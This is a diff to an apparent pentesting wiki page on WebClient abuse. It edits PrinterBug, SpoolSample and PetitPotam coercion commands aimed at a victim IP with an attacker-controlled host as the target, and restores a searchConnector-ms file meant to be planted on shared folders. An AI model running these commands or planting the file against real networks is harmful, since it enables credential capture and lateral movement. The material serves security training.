@@ -56,8 +56,8 @@ Below are a few examples of WebClient abuse with [PrinterBug](../print-spooler-s
 
 ```bash
 # PrinterBug
-dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/print" "VICTIM_IP"
-SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS_NAME@PORT/print"
+dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
+SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
 
 # PetitPotam
 Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
@@ -90,18 +90,18 @@ net use x: http://$RESPONDER_IP/
 With a [searchConnector-ms](https://docs.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) file uploaded to widely used share within the organisation. Each time a user browses the folder, the WebClient service will start transparently.
 
 ```xml
-xml version="1.0" encoding="UTF-8"?
-
-Microsoft Outlook
-false
-true
-
-{91475FE5-586B-4EBA-8D75-D17434B8CDF6}
-
-
-https://whatever/
-
-
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+    <description>Microsoft Outlook</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <templateInfo>
+        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+    </templateInfo>
+    <simpleLocation>
+        <url>https://whatever/</url>
+    </simpleLocation>
+</searchConnectorDescription>
 ```
 
 
@@ -128,5 +128,7 @@ By using the following [BOF (Beacon Object File)](https://github.com/outflanknl/
 ## Resources
 
 [https://www.webdavsystem.com/server/access/windows](https://www.webdavsystem.com/server/access/windows)
+
 [https://pentestlab.blog/2021/10/20/lateral-movement-webclient](https://pentestlab.blog/2021/10/20/lateral-movement-webclient)
+
 [https://www.tiraniddo.dev/2015/03/starting-webclient-service.html](https://www.tiraniddo.dev/2015/03/starting-webclient-service.html)
